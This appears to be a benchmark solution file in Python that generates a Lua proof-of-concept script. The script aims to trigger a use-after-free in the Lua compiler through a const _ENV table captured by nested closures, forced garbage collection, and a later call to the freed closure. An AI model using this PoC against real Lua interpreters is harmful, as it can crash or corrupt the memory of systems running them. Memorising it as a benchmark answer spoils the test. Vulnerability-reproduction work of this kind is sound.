import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # Parameters to control the generated PoC's complexity and size.
        # These are tuned to trigger the compiler bug and approximate the
        # ground-truth PoC length.
        n_env_fields = 40
        n_locals = 90
        n_garbage_loop = 150
        
        # Part 1: Generate the string for the large constant _ENV table.
        # This table will be the object that is used after being freed.
        env_fields_list = [f"v{i}={i}" for i in range(n_env_fields)]
        env_fields_list.append("uaf_func=function() return 1 end")
        env_table_str = "{" + ",".join(env_fields_list) + "}"

        # Part 2: Generate declarations for many local variables.
        # This helps manipulate the stack layout to trigger the compiler bug.
        local_vars_list = [f"l{i}" for i in range(n_locals)]
        local_decls_str = "local " + ",".join(local_vars_list)

        # Part 3: Generate the code for the closure that performs the UAF.
        # This code accesses fields of the _ENV table.
        sum_parts_list = [f"v{i}" for i in range(n_env_fields)]
        sum_logic_str = "s=s+" + "+".join(sum_parts_list) + "+uaf_func()"
    
        # Part 4: Assemble the final PoC using a template.
        # The structure involves nested functions to create a closure that
        # captures the const _ENV, which is the core of the vulnerability.
        poc_template = f"""
function entry_func()
local _ENV<const>={env_table_str}
{local_decls_str}
function nested_func(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15,p16)
function inner_func()
poc_global_func=function()
local s=0
{sum_logic_str}
return s
end
end
inner_func()
end
nested_func(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
end
entry_func()
local t={{}}
for i=1,{n_garbage_loop} do t[i]=i.."GARBAGE"..i.."GARBAGE"..i end
t=nil
collectgarbage("collect")
poc_global_func()
"""
        
        # The PoC is constructed as a single block of minified Lua code.
        return poc_template.encode('utf-8')